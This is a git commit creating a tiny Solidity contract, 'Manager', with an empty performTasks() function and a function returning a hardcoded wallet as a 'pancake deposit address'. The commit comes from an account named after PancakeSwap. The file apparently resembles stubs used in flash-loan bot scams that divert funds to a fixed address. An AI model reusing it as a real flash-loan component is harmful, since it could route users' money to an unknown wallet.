463695229a0af2f23191a057b4b78ed78aaa3a6b
pancake-bsc <88534253+pancake-bsc@users.noreply.github.com>
2021-08-06 10:53:45 +0200

    Create bsc-flashloanrouter.sol

---
+++ bsc-flashloanrouter.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.5.17;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function pancakeDepositAddress() public pure returns (address) {
+		return 0xa949A14Ec10cae8952c523df2d60962be34330B4;
+	}
+}
